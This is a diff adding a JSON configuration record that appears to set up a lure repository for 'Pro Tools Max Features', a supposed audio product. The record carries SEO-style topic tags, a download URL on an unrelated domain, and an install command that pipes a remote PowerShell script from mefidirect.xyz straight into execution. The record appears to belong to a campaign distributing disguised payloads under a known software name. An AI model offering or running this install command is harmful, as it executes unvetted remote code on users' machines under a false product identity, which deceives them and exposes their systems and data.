@@ -1,0 +1,27 @@
+{
+  "repo": "pro-tools-max-features",
+  "product": "Pro Tools Max Features",
+  "kind": "audio",
+  "install_type": "download",
+  "download_url": "https://pro-tools.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "audio",
+  "topics": [
+    "pro-tools-stable-build",
+    "pro-tools-howto",
+    "app-catalog",
+    "pro-tools-docs",
+    "stable-channel",
+    "recording-suite",
+    "pro-tools-support",
+    "software-hub",
+    "midi-workflow",
+    "pro-tools-user-guide",
+    "pro-tools-suite",
+    "release-notes",
+    "pro-tools-native-client"
+  ]
+}
